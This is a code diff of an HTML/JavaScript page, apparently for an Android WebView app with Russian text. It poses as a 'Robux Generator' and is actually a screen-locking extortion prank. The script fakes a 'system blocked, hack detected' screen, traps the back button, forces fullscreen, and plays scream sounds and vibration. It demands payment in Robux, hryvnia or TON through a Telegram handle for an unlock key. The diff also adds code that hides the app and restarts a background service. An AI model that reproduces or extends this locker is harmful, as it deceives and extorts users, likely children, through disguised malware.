@@ -5,420 +5,282 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Robux Generator</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body, html {
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #0b0c10;
-            color: white;
-            user-select: none;
-            -webkit-user-select: none;
-            -webkit-touch-callout: none;
-        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body, html { width:100%; height:100%; overflow:hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background:#0b0c10; color:white; user-select:none; -webkit-user-select:none; -webkit-touch-callout:none; }
 
-        /* Главный экран генератора */
         #screen-normal {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100%;
-            background: linear-gradient(145deg, #1a1a2e, #16213e);
-            padding: 20px;
-            position: relative;
-            transition: opacity 0.5s;
+            display:flex; flex-direction:column; align-items:center; justify-content:center;
+            height:100%; background:linear-gradient(145deg, #1a1a2e, #16213e);
+            padding:20px; position:relative; transition:opacity 0.5s;
         }
-        .logo {
-            font-size: 4em;
-            font-weight: 900;
-            background: linear-gradient(45deg, #ff4444, #ff8c00);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            margin-bottom: 10px;
-            text-shadow: 0 0 20px rgba(255, 68, 68, 0.5);
-        }
-        .subtitle {
-            font-size: 1.4em;
-            color: #cccccc;
-            margin-bottom: 40px;
-        }
+        .logo { font-size:4em; font-weight:900; background:linear-gradient(45deg, #ff4444, #ff8c00); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; margin-bottom:10px; text-shadow:0 0 20px rgba(255,68,68,0.5); }
+        .subtitle { font-size:1.4em; color:#ccc; margin-bottom:40px; }
         input[type="text"] {
-            width: 80%;
-            max-width: 300px;
-            padding: 15px 20px;
-            font-size: 1.2em;
-            border: 2px solid #333;
-            border-radius: 30px;
-            background: #121212;
-            color: white;
-            outline: none;
-            text-align: center;
-            margin-bottom: 30px;
-            transition: border 0.3s;
+            width:80%; max-width:300px; padding:15px 20px; font-size:1.2em; border:2px solid #333;
+            border-radius:30px; background:#121212; color:white; outline:none; text-align:center;
+            margin-bottom:30px; transition:border 0.3s;
         }
-        input[type="text"]:focus {
-            border-color: #ff4444;
-        }
+        input[type="text"]:focus { border-color:#ff4444; }
         .btn {
-            background: linear-gradient(45deg, #ff4444, #ff6600);
-            border: none;
-            padding: 15px 40px;
-            font-size: 1.3em;
-            font-weight: bold;
-            border-radius: 40px;
-            color: white;
-            cursor: pointer;
-            box-shadow: 0 0 25px rgba(255, 68, 68, 0.7);
-            transition: transform 0.2s, box-shadow 0.2s;
-            letter-spacing: 1px;
+            background:linear-gradient(45deg, #ff4444, #ff6600); border:none; padding:15px 40px;
+            font-size:1.3em; font-weight:bold; border-radius:40px; color:white; cursor:pointer;
+            box-shadow:0 0 25px rgba(255,68,68,0.7); transition:transform 0.2s, box-shadow 0.2s;
+            letter-spacing:1px;
         }
-        .btn:active {
-            transform: scale(0.96);
-            box-shadow: 0 0 35px rgba(255, 68, 68, 1);
-        }
+        .btn:active { transform:scale(0.96); box-shadow:0 0 35px rgba(255,68,68,1); }
 
-        /* Экран блокировки */
         #screen-blocked {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100%;
-            background: #000000;
-            padding: 20px;
-            position: relative;
-            text-align: center;
+            display:none; flex-direction:column; align-items:center; justify-content:center;
+            height:100%; background:#000; padding:20px; position:relative; text-align:center;
         }
         .blocked-title {
-            font-size: 2.5em;
-            font-weight: 800;
-            color: #ff0000;
-            text-shadow: 0 0 30px red;
-            margin-bottom: 20px;
-            animation: pulse 1s infinite;
+            font-size:2.5em; font-weight:800; color:#ff0000; text-shadow:0 0 30px red;
+            margin-bottom:20px; animation:pulse 1s infinite;
         }
         @keyframes pulse {
-            0% { text-shadow: 0 0 15px red; }
-            50% { text-shadow: 0 0 40px red, 0 0 20px orange; }
-            100% { text-shadow: 0 0 15px red; }
+            0%{ text-shadow:0 0 15px red; } 50%{ text-shadow:0 0 40px red, 0 0 20px orange; } 100%{ text-shadow:0 0 15px red; }
         }
         .quest-box {
-            background: rgba(20, 20, 20, 0.9);
-            border: 2px solid #ff4444;
-            border-radius: 20px;
-            padding: 25px;
-            width: 90%;
-            max-width: 350px;
+            background:rgba(20,20,20,0.9); border:2px solid #ff4444; border-radius:20px;
+            padding:25px; width:90%; max-width:350px;
         }
-        .example {
-            font-size: 2em;
-            font-weight: bold;
-            margin: 15px 0;
-        }
-        .progress {
-            color: #aaaaaa;
-            margin-bottom: 10px;
-            font-size: 1.1em;
-        }
+        .example { font-size:2em; font-weight:bold; margin:15px 0; }
+        .progress { color:#aaa; margin-bottom:10px; font-size:1.1em; }
         .answer-input {
-            width: 100%;
-            padding: 12px;
-            font-size: 1.2em;
-            border: 2px solid #555;
-            border-radius: 15px;
-            background: #0a0a0a;
-            color: white;
-            text-align: center;
-            outline: none;
-            margin: 10px 0 20px;
+            width:100%; padding:12px; font-size:1.2em; border:2px solid #555;
+            border-radius:15px; background:#0a0a0a; color:white; text-align:center;
+            outline:none; margin:10px 0 20px;
         }
-        .answer-input:focus {
-            border-color: #ff0000;
-        }
+        .answer-input:focus { border-color:#ff0000; }
         .btn-answer {
-            background: #ff3333;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 30px;
-            font-size: 1.1em;
-            font-weight: bold;
-            color: white;
+            background:#ff3333; border:none; padding:12px 30px; border-radius:30px;
+            font-size:1.1em; font-weight:bold; color:white;
         }
         .final-message {
-            font-size: 1.2em;
-            line-height: 1.6;
-            padding: 20px;
+            font-size:1.2em; line-height:1.6; padding:20px; display: flex; flex-direction: column; gap:15px;
         }
-
-        /* Невидимая полоса выхода */
-        #exit-zone {
-            position: fixed;
-            top: 0;
-            right: 0;
-            width: 15px;
-            height: 100%;
-            z-index: 9999;
-            background: transparent;
+        .password-box {
+            display: flex; flex-direction: column; align-items: center; gap:10px;
         }
+        .password-input {
+            width:80%; padding:12px; font-size:1.2em; border:2px solid #f00;
+            border-radius:15px; background:#000; color:#fff; text-align:center;
+        }
+        #exit-zone { position:fixed; top:0; right:0; width:15px; height:100%; z-index:9999; background:transparent; }
     </style>
 </head>
 <body>
 
-    <!-- Главный экран -->
-    <div id="screen-normal">
-        <div class="logo">ROBUX</div>
-        <div class="subtitle">Генератор Робуксов v5.2</div>
-        <input type="text" id="nickname" placeholder="Введите ваш ник" autocomplete="off">
-        <button class="btn" id="start-btn">▶ Начать получение</button>
-    </div>
+<div id="screen-normal">
+    <div class="logo">ROBUX</div>
+    <div class="subtitle">Генератор Робуксов v5.2</div>
+    <input type="text" id="nickname" placeholder="Введите ваш ник" autocomplete="off">
+    <button class="btn" id="start-btn">▶ Начать получение</button>
+</div>
 
-    <!-- Экран блокировки + квест -->
-    <div id="screen-blocked">
-        <div class="blocked-title">СИСТЕМА ЗАБЛОКИРОВАНА</div>
-        <div style="color:#ff5555; margin-bottom:20px;">ОБНАРУЖЕН ВЗЛОМ</div>
-        <div class="quest-box" id="quest-container">
-            <div class="progress" id="progress-text">Пример 1 из 10</div>
-            <div class="example" id="example-text">7 + 3 = ?</div>
-            <input type="text" class="answer-input" id="answer-input" placeholder="Ответ" autocomplete="off">
-            <button class="btn-answer" id="check-btn">Ответить</button>
-        </div>
-        <!-- Финальное сообщение (скрыто изначально) -->
-        <div id="final-container" style="display:none;">
-            <div class="final-message">
-                Для ключа пиши в Telegram:<br>
-                <b>@Virussupp0rt</b><br><br>
-                Цена: 100 Robux / 50 грн / 1 TON (криптовалюта)
-            </div>
+<div id="screen-blocked">
+    <div class="blocked-title">СИСТЕМА ЗАБЛОКИРОВАНА</div>
+    <div style="color:#ff5555; margin-bottom:20px;">ОБНАРУЖЕН ВЗЛОМ</div>
+    <div class="quest-box" id="quest-container">
+        <div class="progress" id="progress-text">Пример 1 из 10</div>
+        <div class="example" id="example-text">7 + 3 = ?</div>
+        <input type="text" class="answer-input" id="answer-input" placeholder="Ответ" autocomplete="off">
+        <button class="btn-answer" id="check-btn">Ответить</button>
+    </div>
+    <div id="final-container" style="display:none;">
+        <div class="final-message">
+            <div style="font-weight:bold; font-size:1.3em;">🔐 ВВЕДИТЕ КЛЮЧ РАЗБЛОКИРОВКИ</div>
+            <input type="text" class="password-input" id="unlock-input" placeholder="Код" autocomplete="off">
+            <button class="btn-answer" id="unlock-btn">Разблокировать</button>
+            <p style="font-size:0.9em; color:#aaa;">Для получения ключа:<br>Telegram: @Virussupp0rt<br>Цена: 100 Robux / 50 грн / 1 TON</p>
         </div>
     </div>
+</div>
 
-    <!-- Невидимая полоса выхода (работает всегда) -->
-    <div id="exit-zone"></div>
+<div id="exit-zone"></div>
 
-    <!-- Звук скримера -->
-    <audio id="scream-audio" preload="auto">
-        <source src="https://www.soundjay.com/human/sounds/scream-01.mp3" type="audio/mpeg">
-        <!-- Запасная ссылка, если первая не загрузится -->
-        <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg" type="audio/ogg">
-    </audio>
+<audio id="scream-audio" preload="auto">
+    <source src="https://www.soundjay.com/human/sounds/scream-01.mp3" type="audio/mpeg">
+    <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg" type="audio/ogg">
+</audio>
 
-    <script>
-        (function() {
-            // DOM элементы
-            const screenNormal = document.getElementById('screen-normal');
-            const screenBlocked = document.getElementById('screen-blocked');
-            const startBtn = document.getElementById('start-btn');
-            const nicknameInput = document.getElementById('nickname');
-            const answerInput = document.getElementById('answer-input');
-            const checkBtn = document.getElementById('check-btn');
-            const exampleText = document.getElementById('example-text');
-            const progressText = document.getElementById('progress-text');
-            const questContainer = document.getElementById('quest-container');
-            const finalContainer = document.getElementById('final-container');
-            const exitZone = document.getElementById('exit-zone');
-            const screamAudio = document.getElementById('scream-audio');
+<script>
+(function() {
+    const screenNormal = document.getElementById('screen-normal');
+    const screenBlocked = document.getElementById('screen-blocked');
+    const startBtn = document.getElementById('start-btn');
+    const nicknameInput = document.getElementById('nickname');
+    const answerInput = document.getElementById('answer-input');
+    const checkBtn = document.getElementById('check-btn');
+    const exampleText = document.getElementById('example-text');
+    const progressText = document.getElementById('progress-text');
+    const questContainer = document.getElementById('quest-container');
+    const finalContainer = document.getElementById('final-container');
+    const unlockInput = document.getElementById('unlock-input');
+    const unlockBtn = document.getElementById('unlock-btn');
+    const exitZone = document.getElementById('exit-zone');
+    const screamAudio = document.getElementById('scream-audio');
 
-            let blockTimer = null;
-            let questProgress = 0;
-            let currentAnswer = null;
-            let blocked = false;
+    let blockTimer = null;
+    let questProgress = 0;
+    let currentAnswer = null;
+    let blocked = false;
 
-            // Функция выхода из приложения
-            function exitApp() {
-                // Показываем уведомление, если оно запрошено кодом 6677
-                if (window._showRestored) {
-                    alert('Доступ восстановлен');
-                }
-                // Пытаемся вызвать Android интерфейс, иначе window.close()
-                if (window.Android && typeof window.Android.finish === 'function') {
-                    window.Android.finish();
-                } else {
-                    window.close();
-                }
-                // На случай, если close не сработает
-                window.location.href = 'about:blank';
-            }
+    // Функция выхода
+    function exitApp() {
+        if (window.Android && window.Android.unlockAndExit) {
+            Android.unlockAndExit();
+        } else {
+            window.close();
+        }
+    }
 
-            // Секретный выход по коду 6677 (проверяется при вводе в любом поле)
-            function checkSecretCode(inputElement) {
-                if (inputElement.value.trim() === '6677') {
-                    window._showRestored = true; // флаг для уведомления
-                    exitApp();
-                }
-            }
+    // Секретный код 6677 в любом поле
+    function checkSecretCode(inputElement) {
+        if (inputElement.value.trim() === '6677') {
+            exitApp();
+        }
+    }
+    nicknameInput.addEventListener('input', () => checkSecretCode(nicknameInput));
+    answerInput.addEventListener('input', () => checkSecretCode(answerInput));
 
-            // Привязываем проверку к полям
-            nicknameInput.addEventListener('input', function() {
-                checkSecretCode(nicknameInput);
-            });
-            answerInput.addEventListener('input', function() {
-                checkSecretCode(answerInput);
-            });
+    // Невидимая полоса выхода (мгновенное закрытие)
+    exitZone.addEventListener('click', () => exitApp());
 
-            // Невидимая полоса выхода (нажатие в любом месте)
-            exitZone.addEventListener('click', function(e) {
-                e.stopPropagation();
-                exitApp();
-            });
+    // Блокировка кнопки "Назад"
+    function lockBackButton() {
+        history.pushState(null, '', location.href);
+        history.pushState(null, '', location.href);
+        window.addEventListener('popstate', () => {
+            history.pushState(null, '', location.href);
+            if (document.fullscreenEnabled) document.documentElement.requestFullscreen();
+        });
+    }
 
-            // Блокировка кнопки "Назад" через историю
-            function lockBackButton() {
-                history.pushState(null, '', location.href);
-                history.pushState(null, '', location.href);
-                history.pushState(null, '', location.href);
-                window.addEventListener('popstate', function() {
-                    // При попытке вернуться назад — снова пушим и переходим в полноэкранный режим
-                    history.pushState(null, '', location.href);
-                    requestFullscreen();
-                });
-            }
+    // Генерация примера
+    function generateExample() {
+        const ops = ['+', '-', '*', '/'];
+        const op = ops[Math.floor(Math.random() * ops.length)];
+        let a, b, question;
+        if (op === '+') { a=Math.floor(Math.random()*50)+1; b=Math.floor(Math.random()*50)+1; currentAnswer=a+b; }
+        else if (op === '-') { a=Math.floor(Math.random()*50)+20; b=Math.floor(Math.random()*a)+1; currentAnswer=a-b; }
+        else if (op === '*') { a=Math.floor(Math.random()*12)+1; b=Math.floor(Math.random()*12)+1; currentAnswer=a*b; }
+        else if (op === '/') { b=Math.floor(Math.random()*10)+1; a=b*(Math.floor(Math.random()*10)+1); currentAnswer=a/b; }
+        question = a + ' ' + op + ' ' + b + ' = ?';
+        return question;
+    }
 
-            // Полноэкранный режим по клику (автоматический перезапуск)
-            function requestFullscreen() {
-                const elem = document.documentElement;
-                if (elem.requestFullscreen) {
-                    elem.requestFullscreen().catch(() => {});
-                } else if (elem.webkitRequestFullscreen) {
-                    elem.webkitRequestFullscreen();
-                }
-            }
-            document.addEventListener('click', function() {
-                if (!document.fullscreenElement && !document.webkitFullscreenElement) {
-                    requestFullscreen();
-                }
-            });
+    function showNewExample() {
+        exampleText.textContent = generateExample();
+        answerInput.value = '';
+        answerInput.focus();
+    }
 
-            // Генерация случайного примера (сложение, вычитание, умножение, деление без дробей)
-            function generateExample() {
-                const ops = ['+', '-', '*', '/'];
-                const op = ops[Math.floor(Math.random() * ops.length)];
-                let a, b, question;
-                if (op === '+') {
-                    a = Math.floor(Math.random() * 50) + 1;
-                    b = Math.floor(Math.random() * 50) + 1;
-                    currentAnswer = a + b;
-                } else if (op === '-') {
-                    a = Math.floor(Math.random() * 50) + 20;
-                    b = Math.floor(Math.random() * a) + 1;
-                    currentAnswer = a - b;
-                } else if (op === '*') {
-                    a = Math.floor(Math.random() * 12) + 1;
-                    b = Math.floor(Math.random() * 12) + 1;
-                    currentAnswer = a * b;
-                } else if (op === '/') {
-                    b = Math.floor(Math.random() * 10) + 1;
-                    a = b * (Math.floor(Math.random() * 10) + 1);
-                    currentAnswer = a / b;
-                }
-                question = `${a} ${op} ${b} = ?`;
-                return question;
-            }
+    function resetQuest() {
+        questProgress = 0;
+        progressText.textContent = 'Пример 1 из 10';
+        showNewExample();
+        // Вибрация и звук
+        if (window.Android && Android.vibrate) Android.vibrate(500);
+        screamAudio.currentTime = 0;
+        screamAudio.play().catch(()=>{});
+        // Эффект тряски
+        screenBlocked.style.transform = 'translateX(5px)';
+        setTimeout(() => screenBlocked.style.transform = '', 100);
+    }
 
-            // Обновление примера на экране
-            function showNewExample() {
-                const question = generateExample();
-                exampleText.textContent = question;
-                answerInput.value = '';
-                answerInput.focus();
-            }
+    function showFinal() {
+        questContainer.style.display = 'none';
+        finalContainer.style.display = 'block';
+        unlockInput.focus();
+    }
 
-            // Сброс прогресса квеста (при ошибке)
-            function resetQuest() {
-                questProgress = 0;
-                progressText.textContent = `Пример 1 из 10`;
+    // Обработчик ответа на пример
+    function handleAnswer() {
+        const val = answerInput.value.trim();
+        if (val === '6677') { exitApp(); return; }
+        const userAnswer = parseInt(val, 10);
+        if (isNaN(userAnswer)) return;
+        if (userAnswer === currentAnswer) {
+            questProgress++;
+            if (questProgress >= 10) {
+                showFinal();
+                // Дополнительный скример на финише
+                if (Android && Android.vibrate) Android.vibrate(300);
+                screamAudio.play().catch(()=>{});
+            } else {
+                progressText.textContent = 'Пример ' + (questProgress+1) + ' из 10';
                 showNewExample();
-                // Громкий звук скримера
-                screamAudio.currentTime = 0;
-                screamAudio.play().catch(() => {});
-                // Эффект тряски
-                screenBlocked.style.transform = 'translateX(5px)';
-                setTimeout(() => { screenBlocked.style.transform = ''; }, 100);
             }
+        } else {
+            resetQuest();
+        }
+    }
 
-            // Показ финального сообщения
-            function showFinal() {
-                questContainer.style.display = 'none';
-                finalContainer.style.display = 'block';
+    // Активация блокировки (пранк)
+    function activateBlock() {
+        if (blocked) return;
+        blocked = true;
+        if (blockTimer) clearTimeout(blockTimer);
+        screenNormal.style.display = 'none';
+        screenBlocked.style.display = 'flex';
+        questProgress = 0;
+        progressText.textContent = 'Пример 1 из 10';
+        showNewExample();
+        questContainer.style.display = 'block';
+        finalContainer.style.display = 'none';
+
+        // Скрываем приложение через 1 секунду
+        setTimeout(() => {
+            if (window.Android && Android.hideApp) {
+                Android.hideApp();
+                // Запускаем фоновый сервис (уже внутри hideApp)
             }
+        }, 1000);
+    }
 
-            // Обработчик ответа на пример
-            function handleAnswer() {
-                const inputVal = answerInput.value.trim();
-                // Проверка на секретный код (уже вызывается через input, но на всякий случай)
-                if (inputVal === '6677') {
-                    window._showRestored = true;
-                    exitApp();
-                    return;
-                }
-                const userAnswer = parseInt(inputVal, 10);
-                if (isNaN(userAnswer)) {
-                    alert('Введите число!');
-                    return;
-                }
-                if (userAnswer === currentAnswer) {
-                    // Верный ответ
-                    questProgress++;
-                    if (questProgress >= 10) {
-                        showFinal();
-                    } else {
-                        progressText.textContent = `Пример ${questProgress + 1} из 10`;
-                        showNewExample();
-                    }
-                } else {
-                    // Неверный ответ
-                    alert('Неверный ответ! Прогресс сброшен.');
-                    resetQuest();
-                }
+    // Инициализация
+    lockBackButton();
+    if (document.fullscreenEnabled) document.documentElement.requestFullscreen();
+
+    blockTimer = setTimeout(activateBlock, 10000);
+
+    startBtn.addEventListener('click', activateBlock);
+    checkBtn.addEventListener('click', handleAnswer);
+    answerInput.addEventListener('keydown', (e) => { if (e.key==='Enter') handleAnswer(); });
+
+    // Обработчик разблокировки
+    unlockBtn.addEventListener('click', () => {
+        if (unlockInput.value.trim() === '6677') {
+            if (window.Android && Android.vibrate) Android.vibrate(200);
+            exitApp();
+        } else {
+            // Неверный код - скример + вибрация
+            if (window.Android && Android.vibrate) Android.vibrate(800);
+            screamAudio.currentTime = 0;
+            screamAudio.play().catch(()=>{});
+            unlockInput.value = '';
+            unlockInput.placeholder = 'НЕВЕРНЫЙ КОД!';
+            setTimeout(() => unlockInput.placeholder = 'Код', 2000);
+        }
+    });
+    unlockInput.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') unlockBtn.click();
+        // Проверка на 6677 при вводе
+        checkSecretCode(unlockInput);
+    });
+
+    // При возвращении из свёрнутого состояния (если пользователь нажал на уведомление)
+    window.addEventListener('pageshow', () => {
+        if (blocked) {
+            // Убедимся, что сервис работает
+            if (window.Android && Android.restartServiceIfNeeded) {
+                Android.restartServiceIfNeeded();
             }
+        }
+    });
 
-            // Активация блокировки (пранк)
-            function activateBlock() {
-                if (blocked) return;
-                blocked = true;
-                if (blockTimer) clearTimeout(blockTimer);
-                screenNormal.style.display = 'none';
-                screenBlocked.style.display = 'flex';
-                questProgress = 0;
-                progressText.textContent = `Пример 1 из 10`;
-                showNewExample();
-                questContainer.style.display = 'block';
-                finalContainer.style.display = 'none';
-                requestFullscreen();
-            }
-
-            // Инициализация
-            lockBackButton();
-            requestFullscreen();
-
-            // Запуск таймера на 10 секунд до автоматического пранка
-            blockTimer = setTimeout(activateBlock, 10000);
-
-            // Кнопка "Начать получение"
-            startBtn.addEventListener('click', function() {
-                activateBlock();
-            });
-
-            // Кнопка ответа в квесте
-            checkBtn.addEventListener('click', handleAnswer);
-            answerInput.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') {
-                    handleAnswer();
-                }
-            });
-
-            // Дополнительно: не даём свернуть страницу через свайпы (по возможности)
-            document.addEventListener('touchmove', function(e) {
-                e.preventDefault();
-            }, { passive: false });
-
-        })();
-    </script>
+})();
+</script>
 </body>
-              </html>
+</html>
